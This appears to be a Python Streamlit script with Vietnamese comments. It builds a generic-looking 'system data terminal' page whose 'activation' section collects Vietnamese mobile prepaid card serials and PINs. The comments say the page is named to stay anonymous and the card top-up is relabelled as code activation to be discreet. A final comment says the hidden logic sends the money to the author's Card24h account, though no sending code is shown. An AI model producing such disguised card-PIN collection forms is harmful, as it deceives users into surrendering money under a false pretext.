import streamlit as st
from config import PARTNER_ID, PARTNER_KEY

# Tên giao diện mới - Cực kỳ phổ thông để ẩn danh
st.set_page_config(page_title="Hệ thống Quản lý Dữ liệu", page_icon="⚙️")

st.title("⚙️ SYSTEM DATA TERMINAL v1.0")
st.write("---")

# Nội dung bên dưới anh có thể để trống hoặc viết vài dòng kỹ thuật
st.subheader("Trạng thái hệ thống")
st.success("Máy chủ đang hoạt động bình thường...")

# Phần nạp thẻ anh đổi tên thành "Kích hoạt mã nguồn" cho kín đáo
with st.expander("🔑 KÍCH HOẠT HỆ THỐNG"):
    st.write("Nhập mã kích hoạt để tiếp tục sử dụng dịch vụ")
    telco = st.selectbox("Loại thẻ", ["VIETTEL", "VINAPHONE", "MOBIFONE"])
    amount = st.selectbox("Mệnh giá", ["10.000", "20.000", "50.000", "100.000", "200.000", "500.000"])
    serial = st.text_input("Số Seri")
    pin = st.text_input("Mã PIN")
    
    if st.button("XÁC NHẬN"):
        if serial and pin:
            st.info("Đang kiểm tra thông tin trên máy chủ...")
            # Logic chạy ngầm vẫn gửi tiền về Card24h của anh
        else:
            st.error("Vui lòng không để trống thông tin.")

st.write("---")
st.caption("Copyright 2026 - Secure Connection")
